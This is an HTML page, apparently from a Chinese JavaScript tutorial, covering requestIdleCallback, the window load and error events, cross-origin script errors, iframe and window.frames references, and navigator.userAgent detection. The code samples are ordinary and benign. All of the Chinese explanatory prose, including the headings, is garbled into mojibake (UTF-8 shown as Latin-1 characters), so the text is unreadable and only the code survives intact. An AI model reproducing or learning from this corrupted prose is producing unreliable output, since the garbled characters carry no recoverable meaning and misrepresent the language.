<p><code>options</code>å‚æ•°æ˜¯ä¸€ä¸ªé…ç½®å¯¹è±¡ï¼Œç›®å‰åªæœ‰<code>timeout</code>ä¸€ä¸ªå±æ€§ï¼Œç”¨æ¥æŒ‡å®šå›è°ƒå‡½æ•°æ¨è¿Ÿæ‰§è¡Œçš„æœ€å¤§æ¯«ç§’æ•°ã€‚è¯¥å‚æ•°å¯é€‰ã€‚</p>
<p><code>window.requestIdleCallback()</code>æ–¹æ³•è¿”å›ä¸€ä¸ªæ•´æ•°ã€‚è¯¥æ•´æ•°å¯ä»¥ä¼ å…¥<code>window.cancelIdleCallback()</code>å–æ¶ˆå›è°ƒå‡½æ•°ã€‚</p>
<p>ä¸‹é¢æ˜¯ä¸€ä¸ªä¾‹å­ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">requestIdleCallback(myNonEssentialWork);</span><br><span class="line"></span><br><span class="line">function myNonEssentialWork(deadline) &#123;</span><br><span class="line">  while (deadline.timeRemaining() &gt; 0) &#123;</span><br><span class="line">    doWorkIfNeeded();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ä¸Šé¢ä»£ç ä¸­ï¼Œ<code>requestIdleCallback()</code>ç”¨æ¥æ‰§è¡Œéå…³é”®ä»»åŠ¡<code>myNonEssentialWork</code>ã€‚è¯¥ä»»åŠ¡å…ˆç¡®è®¤æœ¬æ¬¡ç©ºé—²æ—¶æ®µæœ‰å‰©ä½™æ—¶é—´ï¼Œç„¶åæ‰çœŸæ­£å¼€å§‹æ‰§è¡Œä»»åŠ¡ã€‚</p>
<p>ä¸‹é¢æ˜¯æŒ‡å®š<code>timeout</code>çš„ä¾‹å­ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">requestIdleCallback(processPendingAnalyticsEvents, &#123; timeout: 2000 &#125;);</span><br></pre></td></tr></table></figure>

<p>ä¸Šé¢ä»£ç æŒ‡å®šï¼Œ<code>processPendingAnalyticsEvents</code>å¿…é¡»åœ¨æœªæ¥2ç§’ä¹‹å†…æ‰§è¡Œã€‚</p>
<p>å¦‚æœç”±äºè¶…æ—¶å¯¼è‡´å›è°ƒå‡½æ•°æ‰§è¡Œï¼Œåˆ™<code>deadline.timeRemaining()</code>è¿”å›<code>0</code>ï¼Œ<code>deadline.didTimeout</code>è¿”å›<code>true</code>ã€‚</p>
<p>å¦‚æœå¤šæ¬¡æ‰§è¡Œ<code>window.requestIdleCallback()</code>ï¼ŒæŒ‡å®šå¤šä¸ªå›è°ƒå‡½æ•°ï¼Œé‚£ä¹ˆè¿™äº›å›è°ƒå‡½æ•°å°†æ’æˆä¸€ä¸ªé˜Ÿåˆ—ï¼ŒæŒ‰ç…§å…ˆè¿›å…ˆå‡ºçš„é¡ºåºæ‰§è¡Œã€‚</p>
<h3 id="äº‹ä»¶"><a href="#äº‹ä»¶" class="headerlink" title="äº‹ä»¶"></a>äº‹ä»¶</h3><p><code>window</code>å¯¹è±¡å¯ä»¥æ¥æ”¶ä»¥ä¸‹äº‹ä»¶ã€‚</p>
<h4 id="load-äº‹ä»¶å’Œ-onload-å±æ€§"><a href="#load-äº‹ä»¶å’Œ-onload-å±æ€§" class="headerlink" title="load äº‹ä»¶å’Œ onload å±æ€§"></a>load äº‹ä»¶å’Œ onload å±æ€§</h4><p><code>load</code>äº‹ä»¶å‘ç”Ÿåœ¨æ–‡æ¡£åœ¨æµè§ˆå™¨çª—å£åŠ è½½å®Œæ¯•æ—¶ã€‚<code>window.onload</code>å±æ€§å¯ä»¥æŒ‡å®šè¿™ä¸ªäº‹ä»¶çš„å›è°ƒå‡½æ•°ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">window.onload &#x3D; function() &#123;</span><br><span class="line">  var elements &#x3D; document.getElementsByClassName(&#39;example&#39;);</span><br><span class="line">  for (var i &#x3D; 0; i &lt; elements.length; i++) &#123;</span><br><span class="line">    var elt &#x3D; elements[i];</span><br><span class="line">    &#x2F;&#x2F; ...</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>ä¸Šé¢ä»£ç åœ¨ç½‘é¡µåŠ è½½å®Œæ¯•åï¼Œè·å–æŒ‡å®šå…ƒç´ å¹¶è¿›è¡Œå¤„ç†ã€‚</p>
<h4 id="error-äº‹ä»¶å’Œ-onerror-å±æ€§"><a href="#error-äº‹ä»¶å’Œ-onerror-å±æ€§" class="headerlink" title="error äº‹ä»¶å’Œ onerror å±æ€§"></a>error äº‹ä»¶å’Œ onerror å±æ€§</h4><p>æµè§ˆå™¨è„šæœ¬å‘ç”Ÿé”™è¯¯æ—¶ï¼Œä¼šè§¦å‘<code>window</code>å¯¹è±¡çš„<code>error</code>äº‹ä»¶ã€‚æˆ‘ä»¬å¯ä»¥é€šè¿‡<code>window.onerror</code>å±æ€§å¯¹è¯¥äº‹ä»¶æŒ‡å®šå›è°ƒå‡½æ•°ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">window.onerror &#x3D; function (message, filename, lineno, colno, error) &#123;</span><br><span class="line">  console.log(&quot;å‡ºé”™äº†ï¼--&gt; %s&quot;, error.stack);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>ç”±äºå†å²åŸå› ï¼Œ<code>window</code>çš„<code>error</code>äº‹ä»¶çš„å›è°ƒå‡½æ•°ä¸æ¥å—é”™è¯¯å¯¹è±¡ä½œä¸ºå‚æ•°ï¼Œè€Œæ˜¯ä¸€å…±å¯ä»¥æ¥å—äº”ä¸ªå‚æ•°ï¼Œå®ƒä»¬çš„å«ä¹‰ä¾æ¬¡å¦‚ä¸‹ã€‚</p>
<ul>
<li>å‡ºé”™ä¿¡æ¯</li>
<li>å‡ºé”™è„šæœ¬çš„ç½‘å€</li>
<li>è¡Œå·</li>
<li>åˆ—å·</li>
<li>é”™è¯¯å¯¹è±¡</li>
</ul>
<p>è€å¼æµè§ˆå™¨åªæ”¯æŒå‰ä¸‰ä¸ªå‚æ•°ã€‚</p>
<p>å¹¶ä¸æ˜¯æ‰€æœ‰çš„é”™è¯¯ï¼Œéƒ½ä¼šè§¦å‘ JavaScript çš„<code>error</code>äº‹ä»¶ï¼ˆå³è®© JavaScript æŠ¥é”™ï¼‰ã€‚ä¸€èˆ¬æ¥è¯´ï¼Œåªæœ‰ JavaScript è„šæœ¬çš„é”™è¯¯ï¼Œæ‰ä¼šè§¦å‘è¿™ä¸ªäº‹ä»¶ï¼Œè€Œåƒèµ„æºæ–‡ä»¶ä¸å­˜åœ¨ä¹‹ç±»çš„é”™è¯¯ï¼Œéƒ½ä¸ä¼šè§¦å‘ã€‚</p>
<p>ä¸‹é¢æ˜¯ä¸€ä¸ªä¾‹å­ï¼Œå¦‚æœæ•´ä¸ªé¡µé¢æœªæ•è·é”™è¯¯è¶…è¿‡3ä¸ªï¼Œå°±æ˜¾ç¤ºè­¦å‘Šã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">window.onerror &#x3D; function(msg, url, line) &#123;</span><br><span class="line">  if (onerror.num++ &gt; onerror.max) &#123;</span><br><span class="line">    alert(&#39;ERROR: &#39; + msg + &#39;\n&#39; + url + &#39;:&#39; + line);</span><br><span class="line">    return true;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">onerror.max &#x3D; 3;</span><br><span class="line">onerror.num &#x3D; 0;</span><br></pre></td></tr></table></figure>

<p>éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œå¦‚æœè„šæœ¬ç½‘å€ä¸ç½‘é¡µç½‘å€ä¸åœ¨åŒä¸€ä¸ªåŸŸï¼ˆæ¯”å¦‚ä½¿ç”¨äº† CDNï¼‰ï¼Œæµè§ˆå™¨æ ¹æœ¬ä¸ä¼šæä¾›è¯¦ç»†çš„å‡ºé”™ä¿¡æ¯ï¼Œåªä¼šæç¤ºå‡ºé”™ï¼Œé”™è¯¯ç±»å‹æ˜¯â€œScript error.â€ï¼Œè¡Œå·ä¸º0ï¼Œå…¶ä»–ä¿¡æ¯éƒ½æ²¡æœ‰ã€‚è¿™æ˜¯æµè§ˆå™¨é˜²æ­¢å‘å¤–éƒ¨è„šæœ¬æ³„æ¼ä¿¡æ¯ã€‚ä¸€ä¸ªè§£å†³æ–¹æ³•æ˜¯åœ¨è„šæœ¬æ‰€åœ¨çš„æœåŠ¡å™¨ï¼Œè®¾ç½®<code>Access-Control-Allow-Origin</code>çš„ HTTP å¤´ä¿¡æ¯ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Access-Control-Allow-Origin: *</span><br></pre></td></tr></table></figure>

<p>ç„¶åï¼Œåœ¨ç½‘é¡µçš„<code>&lt; script&gt;</code>æ ‡ç­¾ä¸­è®¾ç½®<code>crossorigin</code>å±æ€§ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script crossorigin&#x3D;&quot;anonymous&quot; src&#x3D;&quot;&#x2F;&#x2F;example.com&#x2F;file.js&quot;&gt;&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>

<p>ä¸Šé¢ä»£ç çš„<code>crossorigin=&quot;anonymous&quot;</code>è¡¨ç¤ºï¼Œè¯»å–æ–‡ä»¶ä¸éœ€è¦èº«ä»½ä¿¡æ¯ï¼Œå³ä¸éœ€è¦ cookie å’Œ HTTP è®¤è¯ä¿¡æ¯ã€‚å¦‚æœè®¾ä¸º<code>crossorigin=&quot;use-credentials&quot;</code>ï¼Œå°±è¡¨ç¤ºæµè§ˆå™¨ä¼šä¸Šä¼  cookie å’Œ HTTP è®¤è¯ä¿¡æ¯ï¼ŒåŒæ—¶è¿˜éœ€è¦æœåŠ¡å™¨ç«¯æ‰“å¼€ HTTP å¤´ä¿¡æ¯<code>Access-Control-Allow-Credentials</code>ã€‚</p>
<h4 id="window-å¯¹è±¡çš„äº‹ä»¶ç›‘å¬å±æ€§"><a href="#window-å¯¹è±¡çš„äº‹ä»¶ç›‘å¬å±æ€§" class="headerlink" title="window å¯¹è±¡çš„äº‹ä»¶ç›‘å¬å±æ€§"></a>window å¯¹è±¡çš„äº‹ä»¶ç›‘å¬å±æ€§</h4><p>é™¤äº†å…·å¤‡å…ƒç´ èŠ‚ç‚¹éƒ½æœ‰çš„ GlobalEventHandlers æ¥å£ï¼Œ<code>window</code>å¯¹è±¡è¿˜å…·æœ‰ä»¥ä¸‹çš„äº‹ä»¶ç›‘å¬å‡½æ•°å±æ€§ã€‚</p>
<ul>
<li><code>window.onafterprint</code>ï¼š<code>afterprint</code>äº‹ä»¶çš„ç›‘å¬å‡½æ•°ã€‚</li>
<li><code>window.onbeforeprint</code>ï¼š<code>beforeprint</code>äº‹ä»¶çš„ç›‘å¬å‡½æ•°ã€‚</li>
<li><code>window.onbeforeunload</code>ï¼š<code>beforeunload</code>äº‹ä»¶çš„ç›‘å¬å‡½æ•°ã€‚</li>
<li><code>window.onhashchange</code>ï¼š<code>hashchange</code>äº‹ä»¶çš„ç›‘å¬å‡½æ•°ã€‚</li>
<li><code>window.onlanguagechange</code>: <code>languagechange</code>çš„ç›‘å¬å‡½æ•°ã€‚</li>
<li><code>window.onmessage</code>ï¼š<code>message</code>äº‹ä»¶çš„ç›‘å¬å‡½æ•°ã€‚</li>
<li><code>window.onmessageerror</code>ï¼š<code>MessageError</code>äº‹ä»¶çš„ç›‘å¬å‡½æ•°ã€‚</li>
<li><code>window.onoffline</code>ï¼š<code>offline</code>äº‹ä»¶çš„ç›‘å¬å‡½æ•°ã€‚</li>
<li><code>window.ononline</code>ï¼š<code>online</code>äº‹ä»¶çš„ç›‘å¬å‡½æ•°ã€‚</li>
<li><code>window.onpagehide</code>ï¼š<code>pagehide</code>äº‹ä»¶çš„ç›‘å¬å‡½æ•°ã€‚</li>
<li><code>window.onpageshow</code>ï¼š<code>pageshow</code>äº‹ä»¶çš„ç›‘å¬å‡½æ•°ã€‚</li>
<li><code>window.onpopstate</code>ï¼š<code>popstate</code>äº‹ä»¶çš„ç›‘å¬å‡½æ•°ã€‚</li>
<li><code>window.onstorage</code>ï¼š<code>storage</code>äº‹ä»¶çš„ç›‘å¬å‡½æ•°ã€‚</li>
<li><code>window.onunhandledrejection</code>ï¼šæœªå¤„ç†çš„ Promise å¯¹è±¡çš„<code>reject</code>äº‹ä»¶çš„ç›‘å¬å‡½æ•°ã€‚</li>
<li><code>window.onunload</code>ï¼š<code>unload</code>äº‹ä»¶çš„ç›‘å¬å‡½æ•°ã€‚</li>
</ul>
<h3 id="å¤šçª—å£æ“ä½œ"><a href="#å¤šçª—å£æ“ä½œ" class="headerlink" title="å¤šçª—å£æ“ä½œ"></a>å¤šçª—å£æ“ä½œ</h3><p>ç”±äºç½‘é¡µå¯ä»¥ä½¿ç”¨<code>iframe</code>å…ƒç´ ï¼ŒåµŒå…¥å…¶ä»–ç½‘é¡µï¼Œå› æ­¤ä¸€ä¸ªç½‘é¡µä¹‹ä¸­ä¼šå½¢æˆå¤šä¸ªçª—å£ã€‚å¦‚æœå­çª—å£ä¹‹ä¸­åˆåµŒå…¥åˆ«çš„ç½‘é¡µï¼Œå°±ä¼šå½¢æˆå¤šçº§çª—å£ã€‚</p>
<h4 id="çª—å£çš„å¼•ç”¨"><a href="#çª—å£çš„å¼•ç”¨" class="headerlink" title="çª—å£çš„å¼•ç”¨"></a>çª—å£çš„å¼•ç”¨</h4><p>å„ä¸ªçª—å£ä¹‹ä¸­çš„è„šæœ¬ï¼Œå¯ä»¥å¼•ç”¨å…¶ä»–çª—å£ã€‚æµè§ˆå™¨æä¾›äº†ä¸€äº›ç‰¹æ®Šå˜é‡ï¼Œç”¨æ¥è¿”å›å…¶ä»–çª—å£ã€‚</p>
<ul>
<li><code>top</code>ï¼šé¡¶å±‚çª—å£ï¼Œå³æœ€ä¸Šå±‚çš„é‚£ä¸ªçª—å£</li>
<li><code>parent</code>ï¼šçˆ¶çª—å£</li>
<li><code>self</code>ï¼šå½“å‰çª—å£ï¼Œå³è‡ªèº«</li>
</ul>
<p>ä¸‹é¢ä»£ç å¯ä»¥åˆ¤æ–­ï¼Œå½“å‰çª—å£æ˜¯å¦ä¸ºé¡¶å±‚çª—å£ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">if (window.top &#x3D;&#x3D;&#x3D; window.self) &#123;</span><br><span class="line">  &#x2F;&#x2F; å½“å‰çª—å£æ˜¯é¡¶å±‚çª—å£</span><br><span class="line">&#125; else &#123;</span><br><span class="line">  &#x2F;&#x2F; å½“å‰çª—å£æ˜¯å­çª—å£</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ä¸‹é¢çš„ä»£ç è®©çˆ¶çª—å£çš„è®¿é—®å†å²åé€€ä¸€æ¬¡ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">window.parent.history.back();</span><br></pre></td></tr></table></figure>

<p>ä¸è¿™äº›å˜é‡å¯¹åº”ï¼Œæµè§ˆå™¨è¿˜æä¾›ä¸€äº›ç‰¹æ®Šçš„çª—å£åï¼Œä¾›<code>window.open()</code>æ–¹æ³•ã€<code>&lt; a&gt;</code>æ ‡ç­¾ã€<code>&lt; form&gt;</code>æ ‡ç­¾ç­‰å¼•ç”¨ã€‚</p>
<ul>
<li><code>_top</code>ï¼šé¡¶å±‚çª—å£</li>
<li><code>_parent</code>ï¼šçˆ¶çª—å£</li>
<li><code>_blank</code>ï¼šæ–°çª—å£</li>
</ul>
<p>ä¸‹é¢ä»£ç å°±è¡¨ç¤ºåœ¨é¡¶å±‚çª—å£æ‰“å¼€é“¾æ¥ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href&#x3D;&quot;somepage.html&quot; target&#x3D;&quot;_top&quot;&gt;Link&lt;&#x2F;a&gt;</span><br></pre></td></tr></table></figure>

<h4 id="iframe-å…ƒç´ "><a href="#iframe-å…ƒç´ " class="headerlink" title="iframe å…ƒç´ "></a>iframe å…ƒç´ </h4><p>å¯¹äº<code>iframe</code>åµŒå…¥çš„çª—å£ï¼Œ<code>document.getElementById</code>æ–¹æ³•å¯ä»¥æ‹¿åˆ°è¯¥çª—å£çš„ DOM èŠ‚ç‚¹ï¼Œç„¶åä½¿ç”¨<code>contentWindow</code>å±æ€§è·å¾—<code>iframe</code>èŠ‚ç‚¹åŒ…å«çš„<code>window</code>å¯¹è±¡ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">var frame &#x3D; document.getElementById(&#39;theFrame&#39;);</span><br><span class="line">var frameWindow &#x3D; frame.contentWindow;</span><br></pre></td></tr></table></figure>

<p>ä¸Šé¢ä»£ç ä¸­ï¼Œ<code>frame.contentWindow</code>å¯ä»¥æ‹¿åˆ°å­çª—å£çš„<code>window</code>å¯¹è±¡ã€‚ç„¶åï¼Œåœ¨æ»¡è¶³åŒæºé™åˆ¶çš„æƒ…å†µä¸‹ï¼Œå¯ä»¥è¯»å–å­çª—å£å†…éƒ¨çš„å±æ€§ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; è·å–å­çª—å£çš„æ ‡é¢˜</span><br><span class="line">frameWindow.title</span><br></pre></td></tr></table></figure>

<p>&lt; iframe&gt;å…ƒç´ çš„contentDocumentå±æ€§ï¼Œå¯ä»¥æ‹¿åˆ°å­çª—å£çš„documentå¯¹è±¡ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">var frame &#x3D; document.getElementById(&#39;theFrame&#39;);</span><br><span class="line">var frameDoc &#x3D; frame.contentDocument;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; ç­‰åŒäº</span><br><span class="line">var frameDoc &#x3D; frame.contentWindow.document;</span><br></pre></td></tr></table></figure>

<p>&lt; iframe&gt;å…ƒç´ éµå®ˆåŒæºæ”¿ç­–ï¼Œåªæœ‰å½“çˆ¶çª—å£ä¸å­çª—å£åœ¨åŒä¸€ä¸ªåŸŸæ—¶ï¼Œä¸¤è€…ä¹‹é—´æ‰å¯ä»¥ç”¨è„šæœ¬é€šä¿¡ï¼Œå¦åˆ™åªæœ‰ä½¿ç”¨window.postMessageæ–¹æ³•ã€‚</p>
<p>&lt; iframe&gt;çª—å£å†…éƒ¨ï¼Œä½¿ç”¨window.parentå¼•ç”¨çˆ¶çª—å£ã€‚å¦‚æœå½“å‰é¡µé¢æ²¡æœ‰çˆ¶çª—å£ï¼Œåˆ™window.parentå±æ€§è¿”å›è‡ªèº«ã€‚å› æ­¤ï¼Œå¯ä»¥é€šè¿‡window.parentæ˜¯å¦ç­‰äºwindow.selfï¼Œåˆ¤æ–­å½“å‰çª—å£æ˜¯å¦ä¸ºiframeçª—å£ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">if (window.parent !&#x3D;&#x3D; window.self) &#123;</span><br><span class="line">  &#x2F;&#x2F; å½“å‰çª—å£æ˜¯å­çª—å£</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>&lt; iframe&gt;çª—å£çš„windowå¯¹è±¡ï¼Œæœ‰ä¸€ä¸ªframeElementå±æ€§ï¼Œè¿”å›&lt; iframe&gt;åœ¨çˆ¶çª—å£ä¸­çš„ DOM èŠ‚ç‚¹ã€‚å¯¹äºéåµŒå…¥çš„çª—å£ï¼Œè¯¥å±æ€§ç­‰äºnullã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">var f1Element &#x3D; document.getElementById(&#39;f1&#39;);</span><br><span class="line">var f1Window &#x3D; f1Element.contentWindow;</span><br><span class="line"></span><br><span class="line">f1Window.frameElement &#x3D;&#x3D;&#x3D; f1Element &#x2F;&#x2F; true</span><br><span class="line">window.frameElement &#x3D;&#x3D;&#x3D; null &#x2F;&#x2F; true</span><br></pre></td></tr></table></figure>

<h4 id="window-frames-å±æ€§"><a href="#window-frames-å±æ€§" class="headerlink" title="window.frames å±æ€§"></a>window.frames å±æ€§</h4><p><code>window.frames</code>å±æ€§è¿”å›ä¸€ä¸ªç±»ä¼¼æ•°ç»„çš„å¯¹è±¡ï¼Œæˆå‘˜æ˜¯æ‰€æœ‰å­çª—å£çš„<code>window</code>å¯¹è±¡ã€‚å¯ä»¥ä½¿ç”¨è¿™ä¸ªå±æ€§ï¼Œå®ç°çª—å£ä¹‹é—´çš„äº’ç›¸å¼•ç”¨ã€‚æ¯”å¦‚ï¼Œ<code>frames[0]</code>è¿”å›ç¬¬ä¸€ä¸ªå­çª—å£ï¼Œ<code>frames[1].frames[2]</code>è¿”å›ç¬¬äºŒä¸ªå­çª—å£å†…éƒ¨çš„ç¬¬ä¸‰ä¸ªå­çª—å£ï¼Œ<code>parent.frames[1]</code>è¿”å›çˆ¶çª—å£çš„ç¬¬äºŒä¸ªå­çª—å£ã€‚</p>
<p>æ³¨æ„ï¼Œ<code>window.frames</code>æ¯ä¸ªæˆå‘˜çš„å€¼ï¼Œæ˜¯æ¡†æ¶å†…çš„çª—å£ï¼ˆå³æ¡†æ¶çš„<code>window</code>å¯¹è±¡ï¼‰ï¼Œè€Œä¸æ˜¯<code>iframe</code>æ ‡ç­¾åœ¨çˆ¶çª—å£çš„ DOM èŠ‚ç‚¹ã€‚å¦‚æœè¦è·å–æ¯ä¸ªæ¡†æ¶å†…éƒ¨çš„ DOM æ ‘ï¼Œéœ€è¦ä½¿ç”¨<code>window.frames[0].document</code>çš„å†™æ³•ã€‚</p>
<p>å¦å¤–ï¼Œå¦‚æœ<code>&lt;iframe&gt;</code>å…ƒç´ è®¾ç½®äº†<code>name</code>æˆ–<code>id</code>å±æ€§ï¼Œé‚£ä¹ˆå±æ€§å€¼ä¼šè‡ªåŠ¨æˆä¸ºå…¨å±€å˜é‡ï¼Œå¹¶ä¸”å¯ä»¥é€šè¿‡<code>window.frames</code>å±æ€§å¼•ç”¨ï¼Œè¿”å›å­çª—å£çš„<code>window</code>å¯¹è±¡ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; HTML ä»£ç ä¸º &lt;iframe id&#x3D;&quot;myFrame&quot;&gt;</span><br><span class="line">window.myFrame &#x2F;&#x2F; [HTMLIFrameElement]</span><br><span class="line">frames.myframe &#x3D;&#x3D;&#x3D; myFrame &#x2F;&#x2F; true</span><br></pre></td></tr></table></figure>

<p>å¦å¤–ï¼Œ<code>name</code>å±æ€§çš„å€¼ä¼šè‡ªåŠ¨æˆä¸ºå­çª—å£çš„åç§°ï¼Œå¯ä»¥ç”¨åœ¨<code>window.open</code>æ–¹æ³•çš„ç¬¬äºŒä¸ªå‚æ•°ï¼Œæˆ–è€…<code>&lt;a&gt;</code>å’Œ<code>&lt;frame&gt;</code>æ ‡ç­¾çš„<code>target</code>å±æ€§ã€‚</p>
<h2 id="Navigator-å¯¹è±¡ï¼ŒScreen-å¯¹è±¡ã€‚"><a href="#Navigator-å¯¹è±¡ï¼ŒScreen-å¯¹è±¡ã€‚" class="headerlink" title="Navigator å¯¹è±¡ï¼ŒScreen å¯¹è±¡ã€‚"></a>Navigator å¯¹è±¡ï¼ŒScreen å¯¹è±¡ã€‚</h2><p><code>window.navigator</code>å±æ€§æŒ‡å‘ä¸€ä¸ªåŒ…å«æµè§ˆå™¨å’Œç³»ç»Ÿä¿¡æ¯çš„ Navigator å¯¹è±¡ã€‚è„šæœ¬é€šè¿‡è¿™ä¸ªå±æ€§äº†è§£ç”¨æˆ·çš„ç¯å¢ƒä¿¡æ¯ã€‚</p>
<h3 id="Navigator-å¯¹è±¡çš„å±æ€§"><a href="#Navigator-å¯¹è±¡çš„å±æ€§" class="headerlink" title="Navigator å¯¹è±¡çš„å±æ€§"></a>Navigator å¯¹è±¡çš„å±æ€§</h3><h4 id="Navigator-userAgent"><a href="#Navigator-userAgent" class="headerlink" title="Navigator.userAgent"></a>Navigator.userAgent</h4><p><code>navigator.userAgent</code>å±æ€§è¿”å›æµè§ˆå™¨çš„ User Agent å­—ç¬¦ä¸²ï¼Œè¡¨ç¤ºç”¨æˆ·è®¾å¤‡ä¿¡æ¯ï¼ŒåŒ…å«äº†æµè§ˆå™¨çš„å‚å•†ã€ç‰ˆæœ¬ã€æ“ä½œç³»ç»Ÿç­‰ä¿¡æ¯ã€‚</p>
<p>ä¸‹é¢æ˜¯ Chrome æµè§ˆå™¨çš„<code>userAgent</code>ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">navigator.userAgent</span><br><span class="line">&#x2F;&#x2F; &quot;Mozilla&#x2F;5.0 (X11; Linux x86_64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;29.0.1547.57 Safari&#x2F;537.36&quot;</span><br></pre></td></tr></table></figure>

<p>é€šè¿‡<code>userAgent</code>å±æ€§è¯†åˆ«æµè§ˆå™¨ï¼Œä¸æ˜¯ä¸€ä¸ªå¥½åŠæ³•ã€‚å› ä¸ºå¿…é¡»è€ƒè™‘æ‰€æœ‰çš„æƒ…å†µï¼ˆä¸åŒçš„æµè§ˆå™¨ï¼Œä¸åŒçš„ç‰ˆæœ¬ï¼‰ï¼Œéå¸¸éº»çƒ¦ï¼Œè€Œä¸”ç”¨æˆ·å¯ä»¥æ”¹å˜è¿™ä¸ªå­—ç¬¦ä¸²ã€‚è¿™ä¸ªå­—ç¬¦ä¸²çš„æ ¼å¼å¹¶æ— ç»Ÿä¸€è§„å®šï¼Œä¹Ÿæ— æ³•ä¿è¯æœªæ¥çš„é€‚ç”¨æ€§ï¼Œå„ç§ä¸Šç½‘è®¾å¤‡å±‚å‡ºä¸ç©·ï¼Œéš¾ä»¥ç©·å°½ã€‚æ‰€ä»¥ï¼Œç°åœ¨ä¸€èˆ¬ä¸å†é€šè¿‡å®ƒè¯†åˆ«æµè§ˆå™¨äº†ï¼Œè€Œæ˜¯ä½¿ç”¨â€œåŠŸèƒ½è¯†åˆ«â€æ–¹æ³•ï¼Œå³é€ä¸€æµ‹è¯•å½“å‰æµè§ˆå™¨æ˜¯å¦æ”¯æŒè¦ç”¨åˆ°çš„ JavaScript åŠŸèƒ½ã€‚</p>
<p>ä¸è¿‡ï¼Œé€šè¿‡<code>userAgent</code>å¯ä»¥å¤§è‡´å‡†ç¡®åœ°è¯†åˆ«æ‰‹æœºæµè§ˆå™¨ï¼Œæ–¹æ³•å°±æ˜¯æµ‹è¯•æ˜¯å¦åŒ…å«<code>mobi</code>å­—ç¬¦ä¸²ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">var ua &#x3D; navigator.userAgent.toLowerCase();</span><br><span class="line"></span><br><span class="line">if (&#x2F;mobi&#x2F;.test(ua)) &#123;</span><br><span class="line">  &#x2F;&#x2F; æ‰‹æœºæµè§ˆå™¨</span><br><span class="line">&#125; else &#123;</span><br><span class="line">  &#x2F;&#x2F; éæ‰‹æœºæµè§ˆå™¨</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å¦‚æœæƒ³è¦è¯†åˆ«æ‰€æœ‰ç§»åŠ¨è®¾å¤‡çš„æµè§ˆå™¨ï¼Œå¯ä»¥æµ‹è¯•æ›´å¤šçš„ç‰¹å¾å­—ç¬¦ä¸²ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;mobi|android|touch|mini&#x2F;.test(ua)</span><br></pre></td></tr></table></figure>

